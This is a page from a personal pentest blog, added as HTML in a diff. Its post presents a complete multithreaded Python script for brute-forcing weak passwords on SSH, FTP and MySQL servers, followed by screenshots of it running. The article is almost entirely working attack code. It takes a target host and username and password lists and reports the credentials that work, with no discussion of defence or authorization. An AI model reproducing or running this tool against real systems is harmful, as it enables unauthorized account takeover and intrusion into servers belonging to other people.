@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content=""/>
+  <meta name="author" content="Reber"/>
+  
+    
+      <title>Python 实现多线程弱口令爆破 | Reber&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
+  
+    <link rel="stylesheet" href="/css/style.css"/>
+  
+  
+    <script src="/js/jquery-3.6.0.min.js"/></script>
+  
+    <script src="/js/highlight.min.js"/></script>
+  
+    <script src="/js/style.js"/></script>
+  
+  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <header>
+  <div id="brand">
+    <a class="icon-link" href="https://wyb0.com/">
+      <img
+        class="icon"
+        src="/img/logo.png"
+      />
+    </a>
+    <div class="text">
+      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
+      <h3>只会一点点编程、只会一点点渗透</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/categories/"><b>Categories</b></a>
+      
+         | 
+        <a href="/tags/"><b>Tags</b></a>
+      
+         | 
+        <a href="/about/"><b>About</b></a>
+      
+         | 
+        <a href="/friends/"><b>Friends</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+    <div id="content">
+      
+  <main>
+    <article>
+      <h1>Python 实现多线程弱口令爆破</h1>
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2016-08-26</time>
+    <span>in</span>
+    
+      <a href="/categories/Pentest">Pentest</a>, 
+      <a href="/categories/Python">Python</a>
+  </strong>
+  <span> • 917 words</span>
+  <span> • 2 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/python">python</a>, 
+        <a href="/tags/%E7%88%86%E7%A0%B4">爆破</a>
+    </div>
+  
+</div>
+
+      <div>
+
+<h3 id="0x00-脚本">0x00 脚本</h3>
+
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+'this script can bruter ftp/ssh/mysql'
+
+__author__ = 'reber'
+
+import Queue
+import threading
+import time
+import logging
+import socket
+from optparse import OptionParser
+import paramiko
+from ftplib import FTP
+import MySQLdb
+
+#################公有类#################
+class CommonFun(object):
+    &quot;&quot;&quot;docstring for CommonFun&quot;&quot;&quot;
+    def __init__(self):
+        super(CommonFun, self).__init__()
+
+    def set_log(self,lname):
+        logger = logging.getLogger(lname)
+        logger.setLevel(logging.DEBUG)
+
+        ch = logging.StreamHandler()
+        ch.setLevel(logging.DEBUG)
+
+        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+        ch.setFormatter(formatter)
+
+        logger.addHandler(ch)
+
+    def show_log(self, lname, msg):
+        a = logging.getLogger(lname)
+        a.debug(msg)
+
+    def show_result(self, lname, rlist):
+        if rlist:
+            print &quot;###################################################################&quot;
+            for x in rlist:
+                self.show_log(lname,x)
+        else:
+            print &quot;not found...&quot;
+
+#################SSH爆破模块#################
+class SshBruter(CommonFun):
+    &quot;&quot;&quot;docstring for SshBruter&quot;&quot;&quot;
+    def __init__(self, *args):
+        super(SshBruter, self).__init__()
+        (options,arg) = args
+        self.host = options.host
+        self.userfile = options.userfile
+        self.passfile = options.passfile
+        self.threadnum = options.threadnum
+        self.timeout = options.timeout
+        self.result = []
+        self.set_log(self.host)
+        self.qlist = Queue.Queue()
+        self.is_exit = False
+        print self.host,self.userfile,self.passfile,self.threadnum
+
+    def get_queue(self):
+        with open(self.userfile, 'r') as f:
+            ulines = f.readlines()
+        with open(self.passfile, 'r') as f:
+            plines = f.readlines()
+
+        for name in ulines:
+            for pwd in plines:
+                name = name.strip()
+                pwd = pwd.strip()
+                self.qlist.put(name + ':' + pwd)
+
+    def thread(self):        
+        while not self.qlist.empty():
+            if not self.is_exit:
+                name,pwd = self.qlist.get().split(':')
+                try:
+                    ssh = paramiko.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    ssh.connect(hostname=self.host,port=22,username=name,password=pwd,timeout=self.timeout)
+                    time.sleep(0.05)
+                    ssh.close()
+                    s = &quot;[OK] %s:%s&quot; % (name,pwd)
+                    self.show_log(self.host,s)
+                    self.result.append(s)
+                except socket.timeout:
+                    self.show_log(self.host,&quot;Timeout...&quot;)
+                    self.qlist.put(name + ':' + pwd)
+                    time.sleep(3)
+                except Exception, e:
+                    error = &quot;[Error] %s:%s&quot; % (name,pwd)
+                    self.show_log(self.host,error)
+                    pass
+            else:
+                break
+
+    def run(self):
+        self.get_queue()
+        starttime = time.time()
+
+        threads = []
+        for x in xrange(1,self.threadnum+1):
+            t = threading.Thread(target=self.thread)
+            threads.append(t)
+            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
+            t.start()
+
+        try:
+            while True:
+                if self.qlist.empty():
+                    break
+                else:
+                    time.sleep(1)
+        except KeyboardInterrupt:
+            self.is_exit = True
+            print &quot;Exit the program...&quot;
+        print &quot;Waiting...&quot;
+        time.sleep(5)
+
+        self.show_result(self.host,self.result)
+        finishetime = time.time()
+        print &quot;Used time: %f&quot; % (finishetime-starttime)
+
+#################FTP爆破模块#################
+class FtpBruter(CommonFun):
+    &quot;&quot;&quot;docstring for FtpBruter&quot;&quot;&quot;
+    def __init__(self, *args):
+        super(FtpBruter, self).__init__()
+        (options,arg) = args
+        self.host = options.host
+        self.userfile = options.userfile
+        self.passfile = options.passfile
+        self.threadnum = options.threadnum
+        self.timeout = options.timeout
+        self.result = []
+        self.set_log(self.host)
+        self.qlist = Queue.Queue()
+        print self.host,self.userfile,self.passfile,self.threadnum
+
+    def get_queue(self):
+        with open(self.userfile, 'r') as f:
+            ulines = f.readlines()
+        with open(self.passfile, 'r') as f:
+            plines = f.readlines()
+
+        for name in ulines:
+            for pwd in plines:
+                name = name.strip()
+                pwd = pwd.strip()
+                self.qlist.put(name + ':' + pwd)
+
+    def thread(self):
+        while not self.qlist.empty():
+            name,pwd = self.qlist.get().split(':')
+            try:
+                ftp = FTP()
+                ftp.connect(self.host, 21, self.timeout)
+                ftp.login(name, pwd)
+                time.sleep(0.05)
+                ftp.quit()
+                s = &quot;[OK] %s:%s&quot; % (name,pwd)
+                self.show_log(self.host,s)
+                self.result.append(s)
+            except socket.timeout:
+                self.show_log(self.host,&quot;Timeout...&quot;)
+                self.qlist.put(name + ':' + pwd)
+                time.sleep(1)
+            except Exception, e:
+                error = &quot;[Error] %s:%s&quot; % (name,pwd)
+                self.show_log(self.host,error)
+                pass
+
+    def run(self):
+        self.get_queue()
+        starttime = time.time()
+
+        threads = []
+        for x in xrange(1,self.threadnum+1):
+            t = threading.Thread(target=self.thread)
+            threads.append(t)
+            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
+            t.start()
+
+        try:
+            while True:
+                if self.qlist.empty():
+                    break
+                else:
+                    time.sleep(1)
+        except KeyboardInterrupt:
+            self.is_exit = True
+            print &quot;Exit the program...&quot;
+        print &quot;Waiting...&quot;
+        time.sleep(5)
+
+        self.show_result(self.host,self.result)
+        finishetime = time.time()
+        print &quot;Used time: %f&quot; % (finishetime-starttime)
+
+#################MySQL爆破模块#################
+class MysqlBruter(CommonFun):
+    &quot;&quot;&quot;docstring for MysqlBruter&quot;&quot;&quot;
+    def __init__(self, *args):
+        super(MysqlBruter, self).__init__()
+        (options,arg) = args
+        self.host = options.host
+        self.userfile = options.userfile
+        self.passfile = options.passfile
+        self.threadnum = options.threadnum
+        self.timeout = options.timeout
+        self.result = []
+        self.set_log(self.host)
+        self.qlist = Queue.Queue()
+        print self.host,self.userfile,self.passfile,self.threadnum
+
+    def get_queue(self):
+        with open(self.userfile, 'r') as f:
+            ulines = f.readlines()
+        with open(self.passfile, 'r') as f:
+            plines = f.readlines()
+
+        for name in ulines:
+            for pwd in plines:
+                name = name.strip()
+                pwd = pwd.strip()
+                self.qlist.put(name + ':' + pwd)
+
+    def thread(self):
+        while not self.qlist.empty():
+            name,pwd = self.qlist.get().split(':')
+            try:
+                conn = MySQLdb.connect(host=self.host, user=name, passwd=pwd, db='mysql', port=3306)
+                if conn:
+                    # time.sleep(0.05)
+                    conn.close()
+                s = &quot;[OK] %s:%s&quot; % (name,pwd)
+                self.show_log(self.host,s)
+                self.result.append(s)
+            except socket.timeout:
+                self.show_log(self.host,&quot;Timeout&quot;)
+                self.qlist.put(name + ':' + pwd)
+                time.sleep(3)
+            except Exception, e:
+                error = &quot;[Error] %s:%s&quot; % (name,pwd)
+                self.show_log(self.host,error)
+                pass
+
+    def run(self):
+        self.get_queue()
+        starttime = time.time()
+
+        threads = []
+        for x in xrange(1,self.threadnum+1):
+            t = threading.Thread(target=self.thread)
+            threads.append(t)
+            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
+            t.start()
+
+        try:
+            while True:
+                if self.qlist.empty():
+                    break
+                else:
+                    time.sleep(1)
+        except KeyboardInterrupt:
+            self.is_exit = True
+            print &quot;Exit the program...&quot;
+        print &quot;Waiting...&quot;
+        time.sleep(5)
+
+        self.show_result(self.host,self.result)
+        finishetime = time.time()
+        print &quot;Used time: %f&quot; % (finishetime-starttime)
+
+def main():
+    parser = OptionParser(usage='Usage: python %prog [options] type')
+    parser.add_option('-i','--host',dest='host',help='target ip')
+    parser.add_option('-o','--timeout',type=int,dest='timeout',default=5,help='timeout')
+    parser.add_option('-t','--thread',type=int,dest='threadnum',default=10,help='threadnum')
+    parser.add_option('-L','--userfile',dest='userfile',default='username.txt',help='userfile')
+    parser.add_option('-P','--passfile',dest='passfile',default='password.txt',help='passfile')
+
+    (options, args) = parser.parse_args()
+
+    if not args:
+        parser.print_help()
+        exit()
+
+    if args[0]=='ssh':
+        if options.host:
+            ssh = SshBruter(options, args)
+            ssh.run()
+        else:
+            parser.print_help()
+    elif args[0]=='ftp':
+        if options.host:
+            ftp = FtpBruter(options, args)
+            ftp.run()
+        else:
+            parser.print_help()
+    elif args[0]=='mysql':
+        if options.host:
+            mysql = MysqlBruter(options, args)
+            mysql.run()
+        else:
+            parser.print_help()
+    else:
+        print &quot;type must be ssh or ftp or mysql&quot;
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<h3 id="0x01-尝试爆破">0x01 尝试爆破</h3>
+
+<p><img src="/img/post/bruter_help.png" alt="帮助信息" /></p>
+
+<p><img src="/img/post/bruter_ssh.png" alt="爆破SSH" /></p>
+
+<p><img src="/img/post/bruter_ftp.png" alt="爆破FTP" /></p>
+
+<p><img src="/img/post/bruter_mysql.png" alt="爆破MySQL" /></p>
+</div>
+    </article>
+  </main>
+
+    </div>
+    <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/reber0?_blank">GitHub</a>
+      
+         | 
+        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2015-2022
+    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
+
+    Built with
+    <a href="http://www.gohugo.io/">Hugo</a>,
+    using the theme
+    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
+  </p>
+</footer>
+
+  </body>
+</html>
